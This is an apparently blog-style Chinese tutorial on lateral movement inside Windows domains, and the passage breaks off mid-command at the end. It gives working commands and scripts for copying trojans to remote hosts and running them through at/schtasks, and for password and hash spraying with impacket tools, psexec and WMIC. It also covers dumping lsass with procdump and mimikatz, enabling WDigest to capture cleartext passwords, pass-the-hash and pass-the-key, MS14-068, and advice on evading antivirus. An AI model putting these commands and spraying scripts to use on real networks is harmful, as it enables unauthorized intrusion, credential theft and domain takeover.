<h2 id="横向渗透-域环境"><a href="#横向渗透-域环境" class="headerlink" title="横向渗透|域环境"></a>横向渗透|域环境</h2><h3 id="域环境-传递"><a href="#域环境-传递" class="headerlink" title="域环境|传递"></a>域环境|传递</h3><p>前提：前期信息收集获取到密码的明文或hash。<br>是获取的口令以及hash的传递攻击。<br>不会被系统杀掉，因为是系统自带的命令。</p>
<h4 id="传递-at-schtasks"><a href="#传递-at-schtasks" class="headerlink" title="传递|at&amp;schtasks"></a>传递|at&amp;schtasks</h4><p>此法进行横向渗透:<code>明文（一定一定是明文）</code>传递at&amp;schtasks（计划任务）<br><code>前提：开放139、445端口</code><br>1、作用：at&amp;schtasks命令，可以在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。<br>2、思路：获取到某域主机权限-&gt;minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令<br>3、利用流程<br>（1）、 建立IPC链接到目标主机<br>（2）、 拷贝要执行的命令脚本到目标主机<br>（3）、 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br>（4）、 删除IPC链接<br>4、一些命令<br><code>（1）、建立IPC连接</code><br>连接工作组内主机</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">net use \\<span class="comment">[IP]</span>\ipc$<span class="string">&quot;<span class="subst">[密码]</span>&quot;</span> /user:<span class="comment">[用户名]</span></span><br></pre></td></tr></table></figure>
<p>连接域内主机</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">net use \\<span class="comment">[IP]</span>\ipc$<span class="string">&quot;<span class="subst">[密码]</span>&quot;</span> /user:<span class="comment">[域名]</span>\<span class="comment">[用户名]</span></span><br></pre></td></tr></table></figure>
<p><code>（2）、建立IPC常见的错误代码</code><br>1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限<br>2）51：网络问题，Windows无法找到网络路径<br>3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题<br>4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$<br>5）1219：提供的凭据和已存在的凭据集冲突，说明已建立ipc$，需要先删除<br>6）1326：账号密码错误<br>7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况<br>8）2242：用户密码过期，目标有账号策略，强制定期更改密码<br><code>（3）、建立IPC失败的原因</code><br>1）目标系统不是NT或以上的操作系统<br>2）对方没有打开ipc$共享<br>3）对方未开启139、445端口，<code>或者被防火墙屏蔽</code><br>4）输出命令、账号密码有错误</p>
<h5 id="传递-at"><a href="#传递-at" class="headerlink" title="传递|at"></a>传递|at</h5><p>at &lt; Windows2012<br>建立ipc连接</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">    net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$ </span><span class="string">&quot;Admin12345&quot;</span> /<span class="symbol">user:</span>god.org\administrator</span><br></pre></td></tr></table></figure>
<p>拷贝执行文件（木马）到目标机器</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">    copy <span class="keyword">add</span>.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\<span class="keyword">c</span>$</span><br></pre></td></tr></table></figure>
<p>添加计划任务</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line">   <span class="attribute">at</span> \\<span class="number">192.168.3.21</span> <span class="number">15</span>:<span class="number">47</span> c:\add.bat</span><br></pre></td></tr></table></figure>
<h5 id="传递-schtasks"><a href="#传递-schtasks" class="headerlink" title="传递|schtasks"></a>传递|schtasks</h5><p>schtasks &gt;&#x3D;Windows2012<br>建立ipc连接</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">    net <span class="keyword">use</span> \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$ </span><span class="string">&quot;admin!@#45&quot;</span> /<span class="symbol">user:</span>administrator</span><br></pre></td></tr></table></figure>
<p>复制文件（木马）到其C盘</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">    copy <span class="keyword">add</span>.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\<span class="keyword">c</span>$</span><br></pre></td></tr></table></figure>
<p>创建adduser任务对应执行文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">   schtasks <span class="string">/create</span> <span class="string">/s</span> 192.168.3.32 <span class="string">/ru</span> <span class="string">&quot;SYSTEM&quot;</span> <span class="string">/tn</span> adduser <span class="string">/sc</span> DAILY <span class="string">/tr</span> c:\add.bat <span class="string">/F</span></span><br></pre></td></tr></table></figure>
<p>运行adduser任务</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">  schtasks <span class="regexp">/run /</span>s <span class="number">192.168</span>.<span class="number">3.32</span> <span class="regexp">/tn adduser /i</span></span><br></pre></td></tr></table></figure>
<p>删除adduser任务</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">  schtasks <span class="regexp">/delete /</span>s <span class="number">192.168</span>.<span class="number">3.21</span> <span class="regexp">/tn adduser /</span>f</span><br></pre></td></tr></table></figure>
<h5 id="网络协议工具包-impacket"><a href="#网络协议工具包-impacket" class="headerlink" title="网络协议工具包|impacket"></a>网络协议工具包|impacket</h5><p>获取到的密码为hash显示的话。at和schtasks都不支持hash值的密码，要解决需要用impacket工具包</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">    atexec<span class="selector-class">.exe</span> ./<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span> <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span> <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> -hashes <span class="selector-attr">[密码的hash值]</span> ./<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span> <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> ./administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    atexec<span class="selector-class">.exe</span> -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span> </span><br></pre></td></tr></table></figure>
<p>缺点是要导入到对方主机，要提前免杀。</p>
<h5 id="基于上述传递渗透的综合进阶思路"><a href="#基于上述传递渗透的综合进阶思路" class="headerlink" title="基于上述传递渗透的综合进阶思路"></a>基于上述传递渗透的综合进阶思路</h5><p><code>重点1：横向渗透|明文HASH传递批量利用</code><br>实战中，我们获取到了一台主机的权限，我们可以使用mimikatz跑出当前主机administor的密码，然后将这个密码作为字典，去爆破所有存存活主机。<br>前提：导入impacket<br><code>1、一个密码对多个存活ip（ip作为字典）</code></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">   FOR /F %%i <span class="keyword">in</span> ([每行一个IP.txt]) <span class="keyword">do</span> atexec.exe ./[用户名]:[密码]@%%i <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">   FOR /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line">ips.txt是存活主机的ip；admin!@#45@%%i是当前跑出的密码；若匹配则回显whami执行结果</span><br></pre></td></tr></table></figure>
<p><code>2、多个密码单点爆破IP（密码作为字典）</code></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">   FOR /F %%i <span class="keyword">in</span> ([每行一个密码.txt]) <span class="keyword">do</span> atexec.exe ./[用户名]:%%i@[IP] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">   FOR /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./administrator:%%i@192<span class="number">.168</span><span class="number">.3</span><span class="number">.21</span> whoami</span><br></pre></td></tr></table></figure>
<p><code>3、如果不是明文，是hash</code></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">    FOR /F %%i <span class="keyword">in</span> ([每行一个密码的hash值.txt]) <span class="keyword">do</span> atexec.exe -hashes %%i ./[用户名]@[IP] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    FOR /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe -hashes %%i ./administrator@192<span class="number">.168</span><span class="number">.3</span><span class="number">.21</span> whoami </span><br></pre></td></tr></table></figure>
<p><code>4、用户作为字典</code><br><code>重点2：上述方法是只存在一个变量，我怎么保证每个都可以是变量</code>（省时省力）<br>不需要引入impacket，通过是否成功建立ipc连接判断对应账号密码。<br>py脚本实现，然后把py脚本打包成exe文件，放在对方主机运行。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">ips&#123;</span><br><span class="line">    <span class="string">&#x27;ip1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ip2</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">users&#123;</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="keyword">user</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">passs&#123;</span></span><br><span class="line"><span class="string">    &#x27;</span>pass<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">for ip in ips:</span></span><br><span class="line"><span class="string">  for user in users:</span></span><br><span class="line"><span class="string">    for mima in passs:</span></span><br><span class="line"><span class="string">       exec=&quot;net use \\&quot;+&quot;\\&quot;+ip+&#x27;</span>ipc$<span class="string">&#x27;+mima+&#x27;</span> /<span class="keyword">user</span>:<span class="keyword">domain</span>\\<span class="string">&#x27;+user</span></span><br><span class="line"><span class="string">       print(&#x27;</span><span class="comment">---&gt;&#x27;+exec+&#x27;&lt;---&#x27;)</span></span><br><span class="line">       #os.<span class="keyword">system</span>(exec)</span><br><span class="line">       <span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#domain：域;ips:存活ip；users:（域）用户；passs:收集的密码</span></span><br><span class="line">#（当前用户为非域内用户）执行后net <span class="keyword">user</span>看看，有收获</span><br><span class="line">#随后，就是at|schtasks协议的复现，看上面即可。</span><br></pre></td></tr></table></figure>
<p>随后：<br>安装pyinstaller</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">    pip <span class="keyword">install</span> pyinstaller</span><br></pre></td></tr></table></figure>
<p>生成可执行EXE</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line">    <span class="attribute">pyinstaller</span> -F<span class="meta"> [.py文件]</span></span><br></pre></td></tr></table></figure>
<p>会生成一个同名的exe文件</p>
<h4 id="传递-smb-wmi"><a href="#传递-smb-wmi" class="headerlink" title="传递|smb|wmi"></a>传递|smb|wmi</h4><p><code>前置知识</code><br>1、WDigest 是一个较旧的协议，已被认为不够安全，因为它存储用户密码的明文副本，这使得它容易受到攻击和密码泄露的风险。<br>2、Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码<br>   Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码<br>3、针对以上情况，我们提供了4种方式解决此类问题<br>（1）、利用哈希hash传递（pth、ptk等）进行哈希移动（哈希）<br>（2）、利用其它服务协议（SMB、WMI等）进行哈希移动（哈希）<br>（3）、利用注册表操作开启Wdigest Auth值进行获取（明文）</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">reg <span class="keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span></span><br></pre></td></tr></table></figure>
<p>（4）、利用工具或第三方平台（Hachcat）进行破解获取（明文）<br><code>感觉就是枚举、爆破、碰撞获取明文</code><br>hashcat：<a href="https://zhuanlan.zhihu.com/p/567771788">https://zhuanlan.zhihu.com/p/567771788</a></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">hashcat -<span class="keyword">a</span> <span class="number">0</span> -m <span class="number">1000</span> hash <span class="built_in">file</span> <span class="comment">--force</span></span><br></pre></td></tr></table></figure>
<p><code>Procdump(微软官方-支持全系统)+Mimikatz配合获取密码</code><br>当mimikatz获取失败时配合procdump获取密码</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">生成储存着密码hash值的.dmp文件(可以在自己的电脑运行后拖到目标主机)</span><br><span class="line">    procdump <span class="params">-accepteula</span> <span class="params">-ma</span> lsass.exe lsass.dmp</span><br><span class="line">将dmp文件放到mimikatz上执行（可以获取自己电脑的密码）</span><br><span class="line">    sekurlsa<span class="type">::minidump</span> lsass.dmp</span><br><span class="line">    sekurlsa<span class="type">::logonPasswords</span> <span class="literal">full</span></span><br></pre></td></tr></table></figure>
<p><code>新思路：在实战情况下，mimikatz可能会被干掉，那么只需要在目标主机运行procdump生成.dmp文件，然后拖到自己的电脑配合mimikatz爆目标的密码</code><br>附两款提取密码的软件<br>Pwdump7<br>QuarksPwdump<br>4、Windows系统LM Hash及（NTLM Hash–优先考虑）加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
<h5 id="传递-SMB"><a href="#传递-SMB" class="headerlink" title="传递|SMB"></a>传递|SMB</h5><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。<br><code>1、pstools--建立在获取到明文密码</code><br><code>psexec.exe第一种：</code>先有ipc链接，psexec需要明文或hash传递<br>需要先有ipc链接，-s以System权限运行</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">建立ipc连接 </span><br><span class="line">   <span class="keyword">net</span> <span class="keyword">use</span> \\[IP]\ipc$<span class="string">&quot;[密码]&quot;</span> /user:[用户名]</span><br><span class="line">   <span class="keyword">net</span> <span class="keyword">use</span> \\192.168.3.32\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line">横向渗透</span><br><span class="line">    psexec \\[IP] -s cmd</span><br><span class="line">    psexec \\192.168.3.32 -s cmd</span><br></pre></td></tr></table></figure>
<p><code>psexec.exe第二种：</code>不用建立IPC直接提供明文账户密码</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">psexec \\<span class="selector-attr">[IP]</span> -u <span class="selector-attr">[用户名]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[密码]</span> -s cmd</span><br><span class="line">psexec \\<span class="number">192.168</span>.<span class="number">3.21</span> -u administrator -<span class="selector-tag">p</span> Admin12345 -s cmd </span><br></pre></td></tr></table></figure>
<p><code>若使用psexec.exe时，获取不到明文仅获取到hash时</code></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">psexec -hashes :<span class="selector-attr">[密码的hash值]</span> <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">psexec -hashes :<span class="variable">$HASH</span>$ domain/administrator@<span class="number">10.1</span>.<span class="number">2.3</span></span><br></pre></td></tr></table></figure>
<p><code>官方Pstools无法采用hash连接，还是可以使用impacket工具包，操作简单，容易被杀 </code><br><code>2、smbexec无需先ipc链接</code><br>明文或hash传递都可以，但是这个是集成在impacket内的（也要考虑免杀）。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">连接域内用户</span><br><span class="line">    smbexec <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span></span><br><span class="line">连接本地用户</span><br><span class="line">    smbexec ./<span class="selector-attr">[用户名]</span>:<span class="selector-attr">[密码]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec ./administrator:admin!@#<span class="number">45</span>@<span class="number">192.168</span>.<span class="number">3.32</span></span><br><span class="line">当仅仅获取到hash</span><br><span class="line">    smbexec -hashes :<span class="selector-attr">[密码的hash值]</span> ./<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec -hashes :<span class="variable">$HASH</span>$ ./admin@<span class="number">192.168</span>.<span class="number">3.21</span></span><br><span class="line">    smbexec -hashes :<span class="selector-attr">[密码的hash值]</span> <span class="selector-attr">[域名]</span>/<span class="selector-attr">[用户名]</span>@<span class="selector-attr">[IP]</span></span><br><span class="line">    smbexec -hashes :<span class="variable">$HASH</span>$ domain/admin@<span class="number">192.168</span>.<span class="number">3.21</span> </span><br></pre></td></tr></table></figure>
<h5 id="传递-WMI"><a href="#传递-WMI" class="headerlink" title="传递|WMI"></a>传递|WMI</h5><p>域横向移动WMI服务利用-cscript、wmiexec、wmic<br>WMI(Windows Management Instrumentation)是通过<code>135</code>端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。（这个协议好像仅仅支持连接administor，连接其他用户使用其他协议）<br><code>1、win自带WMIC明文传递，无回显（感觉较为鸡肋）</code><br> <figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">    wmic /node:[IP] /<span class="keyword">user</span>:[用户名] /<span class="keyword">password</span>:[密码] process <span class="keyword">call</span> <span class="keyword">create</span> &quot;[命令]&quot;</span><br><span class="line">    wmic /node:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /<span class="keyword">user</span>:administrator /<span class="keyword">password</span>:Admin12345 process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line">（运行cmd，执行ipconfig并将结果输出到C盘下的<span class="number">1.</span>txt中）</span><br></pre></td></tr></table></figure><br><code>2、win自带cscript明文传递，有回显，需要下载wmiexec.vbs配合</code></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">cscript</span> <span class="comment">//nologo wmiexec.vbs /shell [IP] [用户名] [密码]</span></span><br><span class="line">    <span class="keyword">cscript</span> <span class="comment">//nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span></span><br><span class="line">会反弹一个<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p>下载网址：<a href="https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs">https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs</a><br><code>3、套件impacket wmiexec明文或hash传递，有回显exe版本，可能被杀</code></p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">    wmiexec ./[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec ./administrator:admin!@#<span class="number">45</span>@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    wmiexec [域名]/[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec god/administrator:<span class="symbol">Admin12345</span>@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    wmiexec -hashes :[密码的hash值] ./[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec -hashes :<span class="number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    wmiexec -hashes :[密码的hash值] [域名]/[用户名]:[密码]@[<span class="symbol">IP</span>] <span class="string">&quot;[命令]&quot;</span></span><br><span class="line">    wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="基于上述传递渗透的综合利用思路"><a href="#基于上述传递渗透的综合利用思路" class="headerlink" title="基于上述传递渗透的综合利用思路"></a>基于上述传递渗透的综合利用思路</h5><p><code>域横向移动以上服务hash批量利用-python编译exe</code><br>利用py脚本制作的exe文件批量尝试横向渗透，方便省事，对于仅仅获取到hash的要提一嘴：<code>不同字符串的hash可能一样，所以我们可以利用这个特点，去进行hash碰撞</code>。<br>这里提供一个脚本（py可以进行免杀）</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">import os,time</span><br><span class="line"> </span><br><span class="line">ips=&#123;</span><br><span class="line"><span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">users=&#123;</span><br><span class="line"><span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">hashs=&#123;</span><br><span class="line"><span class="comment">#&#x27;ccef208c6485269c20db2cad21734fe7&#x27;,</span></span><br><span class="line"><span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for ip in ips:</span><br><span class="line">    for <span class="literal">user</span> in users:</span><br><span class="line">        for mimahash in hashs:</span><br><span class="line">            <span class="comment">#域用户和本地用户都试试</span></span><br><span class="line">            <span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line">            <span class="comment">#wmiexec -hashes :hash ./user@ip whoami</span></span><br><span class="line">            <span class="keyword">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+<span class="literal">user</span>+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            exec1 = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; ./&quot;</span>+<span class="literal">user</span>+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="literal">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="keyword">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            <span class="literal">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.<span class="params">system</span>(<span class="keyword">exec</span>)</span><br><span class="line">            os.<span class="params">system</span>(exec1)</span><br><span class="line">            time.<span class="keyword">sleep</span>(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>编译成exe文件</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pyinstaller</span> -F fuck_neiwang_002.py</span><br></pre></td></tr></table></figure>
<h4 id="传递-阶段总结"><a href="#传递-阶段总结" class="headerlink" title="传递|阶段总结"></a>传递|阶段总结</h4><p><code>引出下一个重要内容</code><br><img src="https://pic.imgdb.cn/item/65748049c458853aef0b99c0.jpg"><br>假设对于impacket等免杀不过去，那就要提到PTH、PTT、PTK了。</p>
<h4 id="传递-PTH-PTK-PTT"><a href="#传递-PTH-PTK-PTT" class="headerlink" title="传递|PTH|PTK|PTT"></a>传递|PTH|PTK|PTT</h4><p><code>重要</code><br>PTH(pass the hash)         #利用lm或ntlm的值进行的渗透测试<br>PTT(pass the ticket)        #利用的票据凭证TGT进行的渗透测试<br>PTK(pass the key)           #利用的ekeys aes256进行的渗透测试<br><code>1、PTH和PTK</code><br>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br><code>2、PTT</code><br>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。<br>基于MS14-068漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术（后面详细说）<br><code>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。</code>微软给出的补丁是kb3011780<br><code>Kerberos协议具体工作方法，在域中：</code><br>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密（使用krbtgt密码hash作为密钥），发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)。<br>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据。<br>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测。<br>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。 <code>（TGT类似于cookie，应该这样理解）</code><br><code>所以，PTT和另外两个不同，因为PTT所使用的协议和另外两个不同</code></p>
<h5 id="传递-PTH"><a href="#传递-PTH" class="headerlink" title="传递|PTH"></a>传递|PTH</h5><p>域横向移动PTH传递-mimikatz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取权限</span></span><br><span class="line">    privilege::debug</span><br><span class="line">PTH ntlm传递</span><br><span class="line"><span class="comment">#在未打补丁的工作组及域连接：</span></span><br><span class="line">    sekurlsa::pth /user:[用户名] /domain:[域名或“workgroup”] /ntlm:[ntlm的值]</span><br><span class="line">    sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line"><span class="comment">#“domain”的值为“workgroup”时，连接的是本地用户</span></span><br><span class="line"><span class="comment">#成功会自动创建一个cmd，可以通过该cmd操作对应用户名的机器，如</span></span><br><span class="line"><span class="comment">#查看C盘目录</span></span><br><span class="line">    <span class="built_in">dir</span> \\192.168.3.21\c$</span><br><span class="line"><span class="comment">#IP地址不识别可以换成计算机名</span></span><br></pre></td></tr></table></figure>
<p><code>1、注意：攻击时我们不知道IP、计算机名与用户名对应的情况，所以这是随机攻击，需要再测试看是哪个IP、计算机名对应的电脑被攻击了（还是要看前期信息收、集，直接写脚本跑，看哪个存在回显就是连接到哪台主机的哪个用户）</code><br><code>2、有话说</code>：如果禁用了ntlm认证，PsExec（利用SMB服务传递hash|明文那个）无法利用获得的ntlm hash进行远程连接，<code>但是使用mimikatz(PTH)还是可以攻击成功。</code>对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用AES keys代替NT hash来实现PTK攻击。<br>ps：KB2871997补丁后的影响<br>pth：没打补丁用户都可以连接，打了补丁只能administrator连接<br>ptk：必须打了上面那个补丁用户才可以连接（也就是说PTH受补丁限，可以考虑使用PTK），采用aes256连接<br><a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a><br>顺便提一嘴：补丁信息通过“systeminfo”查看。<br><img src="https://pic.imgdb.cn/item/6575bd1dc458853aefd5eebc.webp" title="补丁对于PTH、PTK的影响"></p>
<h5 id="传递-PTK"><a href="#传递-PTK" class="headerlink" title="传递|PTK"></a>传递|PTK</h5><p>域横向移动PTK传递-mimikatz<br>PTK aes256传递<br>打补丁后的工作组及域连接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">获取权限</span><br><span class="line">    privilege::debug</span><br><span class="line">获取aes值</span><br><span class="line">    sekurlsa::ekeys</span><br><span class="line">连接</span><br><span class="line">    sekurlsa::pth /user:[用户名] /domain:[域名或“workgroup”] /aes256:[aes256的值]</span><br><span class="line">    sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e </span><br></pre></td></tr></table></figure>
<h5 id="传递-PTT"><a href="#传递-PTT" class="headerlink" title="传递|PTT"></a>传递|PTT</h5><p><code>域横向移动PTT传递-ms14068&amp;kekeo&amp;本地</code><br><code>1、利用漏洞ms14-068（类似于cookie伪造）</code><br>作用：能实现域内普通用户直接获取域控system权限<br>操作：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">MS14-<span class="number">068</span> powershell执行</span><br><span class="line"><span class="number">1</span>.查看当前sid</span><br><span class="line">    whoami /user</span><br><span class="line"><span class="number">2</span>.启动mimikatz，不需要提升权限，能用就行</span><br><span class="line">（清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造）</span><br><span class="line">    kerberos::purge</span><br><span class="line">查看当前机器凭证</span><br><span class="line">    kerberos::list</span><br><span class="line">将票据注入到内存中</span><br><span class="line">    kerberos::ptc <span class="selector-attr">[票据文件]</span></span><br><span class="line"><span class="number">3</span>.利用ms14-<span class="number">068</span>生成TGT数据</span><br><span class="line">    ms14-<span class="number">068</span><span class="selector-class">.exe</span> -u <span class="selector-attr">[域成员名]</span>@<span class="selector-attr">[域名]</span> -s <span class="selector-attr">[sid]</span> -d <span 